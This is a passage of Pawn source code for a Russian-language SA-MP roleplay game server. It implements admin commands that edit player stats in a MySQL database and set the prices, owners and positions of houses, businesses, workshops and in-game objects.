		    if(sscanf(params, "uddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [id] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			CarInfo[giveplayerid][carColor_two][cars] = amount;
			format(string, 128, " Цвет 2: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_CARS"` SET color_two = '%i' WHERE id = '%i' AND owner = '%s'", CarInfo[giveplayerid][carColor_two][cars], cars, PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 26:
		{
			PlayerInfo[giveplayerid][pAddiction] = amount;
			format(string, 128, " Зависимость %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pAddiction = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pAddiction], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 27:
		{
			PlayerInfo[giveplayerid][pModel] = amount;
			format(string, 128, " Скин организации игрока: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pModel = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pModel], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 28:
		{
			format(string,128," Временно отключено");
		}
	case 29:
		{
			new cars;
		    if(sscanf(params, "uddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [id] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			if(amount < 4 || amount > 100) return SCM(playerid, COLOR_GREY, " Проценты авто не могут быть больше 100 или меньше 4!");
			CarInfo[giveplayerid][carPercent][cars] = amount;
			format(string, 128, " Проценты Автмобиля: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_CARS"` SET percent = '%i' WHERE id = '%i' AND owner = '%s'", CarInfo[giveplayerid][carPercent][cars], cars, PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 30:
		{
		    new day, month, year;
		    gettime(year, month, day);
			SendMes(giveplayerid,COLOR_GREEN," Вы стали владельцем СТО %i", amount);
			strmid(WorkshopInfo[amount][wOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic4],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic5],"None",0,strlen("None"),MAX_PLAYER_NAME);
			WorkshopInfo[amount][wLandTax] = 6000;
			WorkshopInfo[amount][wBank] = (WorkshopInfo[amount][wAuction][0]/100)*20;
			WorkshopInfo[amount][wProds] = 20000;
			WorkshopInfo[amount][wPriceProds] = 50;
			WorkshopInfo[amount][wZp] = 5;
			strmid(WorkshopInfo[amount][wOwner],PlayerInfo[giveplayerid][pName], 0, 32, 32);
			WGet(giveplayerid);
			strmid(WorkshopInfo[amount][wAuctionName], "None", 0, strlen("None"), 10);
			WorkshopInfo[amount][wAuction][0] = 0;
			WorkshopInfo[amount][wAuction][1] = 0;
			WorkshopInfo[amount][wAuction][2] = 0;
			WorkshopInfo[amount][wAuction][3] = 0;
			WorkshopInfo[amount][wAuction][4] = mktimes(0,0,0,day+14,month,year);

			PlayerInfo[giveplayerid][pAvtomas] = amount;
			//strmid(WorkshopInfo[amount][wOwner], PlayerInfo[giveplayerid][pName], 0, strlen(PlayerInfo[giveplayerid][pName]), MAX_PLAYER_NAME);
			format(string, 128, " Мастерская игрока: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pAvtomas = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pAvtomas], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 31:
		{
			PlayerInfo[giveplayerid][ptaxilvl] = amount;
			format(string, 128, " Скилл таксиста: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET ptaxilvl = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][ptaxilvl], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 32:
		{
			PlayerInfo[giveplayerid][pDrivingSkill] = amount;
			format(string, 128, " Навык вождения: %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pDrivingSkill = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pDrivingSkill], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 33:
	    {
	        if(amount < 0 || amount > 5) return SCM(playerid, COLOR_GREY, " Ключей можно выдать от 0 и до 5");
	        PlayerInfo[giveplayerid][pKeys] = amount;
	        format(string, 128, " Ключи от камер: %i", amount);
  			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pKeys = '%i' WHERE name = '%e'",  PlayerInfo[giveplayerid][pKeys], PlayerInfo[giveplayerid][pName]);
  			mysql_function_query(DATABASE,QUERY,false,"","");
	    }
	case 34:
	    {
			PlayerInfo[giveplayerid][pGRating] = amount;
			format(string, 128, " Рейтинг бандита установлен на %i", amount);
			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pGRating = '%i' WHERE name = '%e'", PlayerInfo[giveplayerid][pGRating], PlayerInfo[giveplayerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
	    }
	}
	SCM(playerid, COLOR_GRAD1, string);
	printf("Администратор %s установил %s stats [ID: %i] [VALUE: %i]", Name(playerid), Name(giveplayerid), stat, amount);
	return true;
}
CMD:offsetstat(playerid, params[])
{
	new giveplayerid[32];
	new stat;
	new amount;
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[32]dd",giveplayerid,stat,amount))
	{
		SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [количество]");
		SCM(playerid, COLOR_GREY, " [1] Уровень|[2] Законопослушность|[3] Материалы|[4] Скин|[5] Преступлений|[6] Номер телефона");
		SCM(playerid, COLOR_GREY, " [7] Exp|[8] Ключ от дома |[9] Номер бизнеса|[10] VIP [1-3]|[11] Работа игрока|[12] Сытость");
		SCM(playerid, COLOR_GREY, " [13] Деньги в банке|[14] Счёт мобильного|[15] Деньги|[16] Варны|[17] Наркотики");
		SCM(playerid, COLOR_GREY, " [18] Член орг|[19] Донат счётчик|[20] Box|[21] Kong Fu|[22] Kick Box");
		SCM(playerid, COLOR_GREY, " [23] Машина|[24] Цвет авто 1|[25] Цвет авто 2|[26] Наркозависимость|[27] Скин организации");
		SCM(playerid, COLOR_GREY, " [28] Помолвлен на|[29] Проценты Авто|[30] Мастерская|[31] Скилл таксиста|[32] Навык вождения");
		SCM(playerid, COLOR_GREY, " [33] Ключи от камеры|[34] Рейтинг бандита");
		return true;
	}
	switch (stat)
	{
	case 1:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pLevel = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " LVL игрока изменён на: %i", amount);
			//DollahScoreUpdate(giveplayerid);
		}
	case 2:
		{
		    mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pZakonp = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Законопослушность: %i", amount);
		}
	case 3:
		{
            mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pMats = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Материалы: %i", amount);
		}
	case 4:
		{
   			//PlayerInfo[giveplayerid][pChar][0] = amount;
			format(string, 128, " Скин игрока установлен на: %i", amount);
		}
	case 5:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pCrimes = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Преступлений: %i", amount);
		}
	case 6:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pPNumbers = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Номер телефона игрока изменён на: %i", amount);
		}
	case 7:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pExp = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " EXP игрока изменены на: %i", amount);
		}
	case 8:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pPHouseKey = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Дом: %i", amount);
		}
	case 9:
		{
		    BizzInfo[amount][bLocked] = 0;
			BizzInfo[amount][bPrice] = 100;
			BizzInfo[amount][bTill] = 0;
			BizzInfo[amount][bLandTax] = BizzLandTax[amount]*12;
			BizzPay[amount] = 0;
			BizzInfo[amount][bLicense] = 0;
			BizzInfo[amount][bStavka] = 0;
			BizzInfo[amount][bMinStavka] = 0;
			BizzInfo[amount][bTimeStavka] = 0;
			BizzInfo[amount][bLastStavka] = 0;
			BizzInfo[amount][bLockTime] = 0;
			BizzInfo[amount][bEntranceCost] = 100;
			strmid(BizzInfo[amount][bOwner],giveplayerid, 0, 32, 32);
			strmid(BizzInfo[amount][bNameStavka], "-", 0, strlen("-"), 10);
			format(string, 128, " Бизнес: %i", amount);
		}
	case 10:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateRank = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " VIP аккаунт уровня: %i", amount);
		}
	case 11:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pJob = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Работа: %i", amount);
		}
	case 12:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Сытость игрока: %i", amount);
		}
	case 13:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Деньги в банке изменены на: %i вирт", amount);
		}
	case 14:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pMobile = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Счёт мобильного: %i вирт", amount);
		}
	case 15:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Деньги изменены на: %i вирт", amount);
		}
	case 16:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pWarns = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Количество варнов изменено на: %i", amount);
		}
	case 17:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pDrugs = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Количество наркотиков изменено на: %i", amount);
		}
	case 18:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pMember = '%i', pRank = '1' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Организация: %i", amount);
		}
	case 19:
		{
   			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateAccount = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Донат счётчик изменён на: %i {F3FF02}GOLD {FFFFFF}COINS", amount);
		}
	case 20:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pBoxSkill = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Уровень боевых искусств Box: %i", amount);
		}
	case 21:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pKongfuSkill = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Уровень боевых искусств Kong Fu: %i", amount);
		}
	case 22:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pKickboxSkill = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Уровень боевых искусств Kick Box: %i", amount);
		}
	case 23:
		{
		    new cars;
		    if(sscanf(params, "s[32]ddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");

			format(string, 128, " Машина: %i", amount);
		}
	case 24:
		{
			new cars;
		    if(sscanf(params, "s[32]ddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");

			format(string, 128, " Цвет 1: %i", amount);
		}
	case 25:
		{
			new cars;
		    if(sscanf(params, "s[32]ddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");

			format(string, 128, " Цвет 2: %i", amount);
		}
	case 26:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pAddiction = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Зависимость %i", amount);
		}
	case 27:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pModel = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Скин организации игрока: %i", amount);
		}
	case 28:
		{
			format(string,128," Временно отключено");
		}
	case 29:
		{
			new cars;
		    if(sscanf(params, "s[32]ddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			if(amount < 4 || amount > 100) return SCM(playerid, COLOR_GREY, " Проценты авто не могут быть больше 100 или меньше 4!");
			
			format(string, 128, " Проценты Автмобиля: %i", amount);
		}
	case 30:
		{
		    new day, month, year;
		    gettime(year, month, day);
			//SendMes(giveplayerid,COLOR_GREEN," Вы стали владельцем СТО %i", amount);
			strmid(WorkshopInfo[amount][wOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic4],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic5],"None",0,strlen("None"),MAX_PLAYER_NAME);
			WorkshopInfo[amount][wLandTax] = 6000;
			WorkshopInfo[amount][wBank] = (WorkshopInfo[amount][wAuction][0]/100)*20;
			WorkshopInfo[amount][wProds] = 20000;
			WorkshopInfo[amount][wPriceProds] = 50;
			WorkshopInfo[amount][wZp] = 5;
			strmid(WorkshopInfo[amount][wOwner],giveplayerid, 0, 32, 32);
			strmid(WorkshopInfo[amount][wAuctionName], "None", 0, strlen("None"), 10);
			WorkshopInfo[amount][wAuction][0] = 0;
			WorkshopInfo[amount][wAuction][1] = 0;
			WorkshopInfo[amount][wAuction][2] = 0;
			WorkshopInfo[amount][wAuction][3] = 0;
			WorkshopInfo[amount][wAuction][4] = mktimes(0,0,0,day+14,month,year);
            mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pAvtomas = '%i' WHERE name = '%e'",amount,giveplayerid);
			//strmid(WorkshopInfo[amount][wOwner], PlayerInfo[giveplayerid][pName], 0, strlen(PlayerInfo[giveplayerid][pName]), MAX_PLAYER_NAME);
			format(string, 128, " Мастерская игрока: %i", amount);
		}
	case 31:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET ptaxilvl = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Скилл таксиста: %i", amount);
		}
	case 32:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pDrivingSkill = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Навык вождения: %i", amount);
		}
	case 33:
	    {
	        if(amount < 0 || amount > 5) return SCM(playerid, COLOR_GREY, " Ключей можно выдать от 0 и до 5");
	        mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pKeys = '%i' WHERE name = '%e'",amount,giveplayerid);
	        format(string, 128, " Ключи от камер: %i", amount);
	    }
	case 34:
	    {
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pGRating = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Рейтинг бандита установлен на %i", amount);
	    }
	}
	mysql_function_query(DATABASE,QUERY,false,"","");
	SCM(playerid, COLOR_GRAD1, string);
	printf("Администратор %s установил %s offline-stats [ID: %i] [VALUE: %i]", Name(playerid), giveplayerid, stat, amount);
	return true;
}
CMD:setgrating(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8) return true;
	new sss[32];
	if(sscanf(params, "s[32]i", sss, params[0])) return SCM(playerid, -1, " Введите: /setgrating [Gang] [Rating]");
	if(params[0] < 0) return SCM(playerid, COLOR_GREY, " Вы ошиблись при вводе рейтинга банды");
	if(!strcmp(sss, "Grove", true))
	{
	    gRating[Grove] = params[0];
	}
	else if(!strcmp(sss, "Ballas", true))
	{
	    gRating[Ballas] = params[0];
	}
	else if(!strcmp(sss, "Vagos", true))
	{
	    gRating[Vagos] = params[0];
	}
	else if(!strcmp(sss, "Aztec", true))
	{
	    gRating[Aztec] = params[0];
	}
	else if(!strcmp(sss, "Rifa", true))
	{
	    gRating[Rifa] = params[0];
	}
	else return SCM(playerid, COLOR_GREY, " Вы ошиблись при вводе названия банды");
	format(string, sizeof(string), " Банде %s начислено %i очков рейтинга", sss, params[0]);
	SCM(playerid, COLOR_GREEN, string);
	printf("Администратор %s начислил банде %s %i очков рейтинга", Name(playerid), sss, params[0]);
	return true;
}
CMD:setklass(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setklass [дом] [класс]");
	HouseInfo[params[0]][hKlass] = params[1];
	SCM(playerid, -1, " Класс установлен");
	printf("Администратор %s установил дому %i %i класс", Name(playerid), params[0], params[1]);
	return true;
}
CMD:getschet(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /getschet [дом]");
	format(YCMDstr, sizeof(YCMDstr), " Счёт домашний: %i",HouseInfo[params[0]][hTakings]);
	SCM(playerid, -1, YCMDstr);
	return true;
}
CMD:setschet(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setschet [дом] [счет]");
	HouseInfo[params[0]][hTakings] = params[1];
	SCM(playerid, -1, " Домашний счет установлен");
	printf("Администратор %s установил дому %i счёт %i вирт", Name(playerid), params[0], params[1]);
	return true;
}
CMD:setcost(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setscost [дом] [цена]");
	HouseInfo[params[0]][hValue] = params[1];
	SCM(playerid, -1, " Стоимость установлена");
	printf("Администратор %s установил дому %i стоимость %i вирт", Name(playerid), params[0], params[1]);
	return true;
}
CMD:sethousepos(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /sethousepos [дом]");
	new Float: lwx, Float:lwy, Float:lwz;
	GetPlayerPos(playerid, lwx, lwy, lwz);
	HouseInfo[params[0]][hEntrancex] = lwx;
	HouseInfo[params[0]][hEntrancey]= lwy;
	HouseInfo[params[0]][hEntrancez] = lwz;
	BuyHouse(params[0]);
    printf("Администратор %s установил координаты дома %i на %f, %f, %f", Name(playerid), params[0], lwx, lwy, lwz);
	return true;
}
CMD:setkvartpos(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /setkvartpos [квартира]");
	if(params[0] < 1) return SCM(playerid,COLOR_GREY," Номер квартиры не может быть менее 1");
	new Float: lwx, Float:lwy, Float:lwz;
	GetPlayerPos(playerid, lwx, lwy, lwz);
	kvartinfo[params[0]][pXpic] = lwx;
	kvartinfo[params[0]][pYpic] = lwy;
	kvartinfo[params[0]][pZpic] = lwz;
	kvartinfo[params[0]][kworld] = GetPlayerVirtualWorld(playerid);
	kvartinfo[params[0]][virtmir] = GetPVarInt(playerid, "podeezd");
	DestroyDynamic3DTextLabel(kvartinfo[params[0]][dtext]);
	format(YCMDstr, sizeof(YCMDstr),"{0076FC}Комната #%i\nПродается: %i вирт\nЧтобы войти, нажмите клавишу 'ENTER'",params[0],kvartinfo[params[0]][kCena]);
	kvartinfo[params[0]][dtext]     =    CreateDynamic3DTextLabel(YCMDstr,0x0076FCFF,kvartinfo[params[0]][pXpic],kvartinfo[params[0]][pYpic],kvartinfo[params[0]][pZpic]+1,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,kvartinfo[params[0]][kworld]);
	updatekvar(params[0]);
	printf("Администратор %s установил координаты квартиры %i на %f, %f, %f", Name(playerid), params[0], lwx, lwy, lwz);
	return true;
}
CMD:setkvartcarpos(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /setkvartcarpos [подъезд]");
	new Float: lwx, Float:lwy, Float:lwz,Float:a;
	GetPlayerPos(playerid, lwx, lwy, lwz);
	GetPlayerFacingAngle(playerid,a);
	if(params[0] < 1) return SCM(playerid,COLOR_GREY," Номер подъезда не может быть менее 1");
	PodeezdInfo[params[0]][carX] = lwx;
	PodeezdInfo[params[0]][carY]= lwy;
	PodeezdInfo[params[0]][carZ] = lwz;
	PodeezdInfo[params[0]][carC] = a;
	SCM(playerid, COLOR_GREY, " Координаты машины установлены");
	printf("Администратор %s установил координаты авто подьезда %i на %f, %f, %f", Name(playerid), params[0], lwx, lwy, lwz);
	return true;
}
CMD:sethousecarpos(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /sethousecarpos [дом]");
	new Float: lwx, Float:lwy, Float:lwz,Float:a;
	GetPlayerPos(playerid, lwx, lwy, lwz);
	GetPlayerFacingAngle(playerid,a);
	HouseInfo[params[0]][hCarx] = lwx;
	HouseInfo[params[0]][hCary]= lwy;
	HouseInfo[params[0]][hCarz] = lwz;
	HouseInfo[params[0]][hCarc] = a;
	SCM(playerid, COLOR_GREY, " Координаты машины установлены");
	printf("Администратор %s установил координаты авто дома %i на %f, %f, %f", Name(playerid), params[0], lwx, lwy, lwz);
	return true;
}
CMD:setbcost(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setbcost [бизнес] [цена]");
	BizzInfo[params[0]][bBuyPrice] = params[1];
	SCM(playerid, -1, " Стоимость бизнеса установлена");
	return true;
}
CMD:setbproducts(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setbproducts [бизнес] [продукты]");
	BizzInfo[params[0]][bProducts] = params[1];
	SCM(playerid, -1, "Количество продуктов установлено");
	return true;
}
CMD:setbizbar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /setbizbar [бизнес]");
	new Float:X,Float:Y,Float:Z; GetPlayerPos(playerid,X,Y,Z);
	BizzInfo[params[0]][bBarX] = X;
	BizzInfo[params[0]][bBarY]= Y;
	BizzInfo[params[0]][bBarZ] = Z;
	SCM(playerid, COLOR_GREY, "Координаты бара установлены");
	return true;
}
CMD:setallbizworld(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	for(new i = 1; i <= TotalBizz; i++) BizzInfo[i][bVirtualWorld] = i;
	SCM(playerid, COLOR_GREY, "Виртуальные миры распределены");
	return true;
}
CMD:setbizexit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /setbizexit [бизнес]");
	if(params[0] > TotalBizz) return SCM(playerid,COLOR_GREY," Неверный ID");
	new Float:X,Float:Y,Float:Z; GetPlayerPos(playerid,X,Y,Z);
	DestroyDynamicPickup(BizzInfo[params[0]][bExitPic]);
	BizzInfo[params[0]][bExitX] = X;
	BizzInfo[params[0]][bExitY]= Y;
	BizzInfo[params[0]][bExitZ] = Z;
	BizzInfo[params[0]][bExitPic] = CreatePickupAC(19132, 23, BizzInfo[params[0]][bExitX], BizzInfo[params[0]][bExitY], BizzInfo[params[0]][bExitZ],BizzInfo[params[0]][bVirtualWorld]);
	SCM(playerid, COLOR_GREY, "Координаты выхода установлены");
	return true;
}
CMD:edit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	ShowPlayerDialogEx(playerid, 3725, DIALOG_STYLE_LIST, "Выберите действие", " [1] Продать все дома\n [2] Продать все бизнесы\n [3] Установить дому интеръер\n [4] Установить дому интерьер часть 2\n [5] Распределить дома\n [6] Распределить цены на дома", "Выбрать", "Закрыть");
	return true;
}
CMD:addstall(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(!GetPVarInt(playerid,"st_object"))
	{
		new Float: posX, Float: posY, Float: posZ;
		GetPlayerPos(playerid, posX, posY, posZ);
		new stobject = CreateDynamicObject(1340,posX,posY,posZ,0,0,0);
		SetPVarInt(playerid,"st_object",stobject);
		EditDynamicObject(playerid,stobject);
		SCM(playerid,COLOR_GREEN,"Поставьте прилавок на нужное место. {ffffff}Для продолжения введите команду ещё раз");
	}
	else ShowPlayerDialogEx(playerid, 1783, DIALOG_STYLE_MSGBOX, "Хот доги", "Продолжить изменять положение объекта", "Да", "Нет");
	return true;
}
CMD:addatm(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(!GetPVarInt(playerid,"st_object"))
	{
		new Float: posX, Float: posY, Float: posZ;
		GetPlayerPos(playerid, posX, posY, posZ);
		new stobject = CreateDynamicObject(2754,posX,posY,posZ,0,0,0);
		SetDynamicObjectMaterial(stobject, 0, 18646, "matcolours", "grey-40-percent", 0);
		SetDynamicObjectMaterial(stobject, 6, 10626, "queens2_sfs", "ws_awning_plum", 0);
		SetDynamicObjectMaterial(stobject, 5, 10626, "queens2_sfs", "ws_awning_plum", 0);
		SetDynamicObjectMaterial(stobject, 4, 16640, "a51", "a51_monitors", 0);
		SetDynamicObjectMaterial(stobject, 2, 4551, "sunset1_lan2", "snpedpurtrm", 0);
		SetDynamicObjectMaterial(stobject, 1, 1376, "cranes_dyn2_cj", "ws_oldpaintedblue", 0);
		SetDynamicObjectMaterial(stobject, 0, 6336, "sunset02_law2", "bank01_LAw", 0);
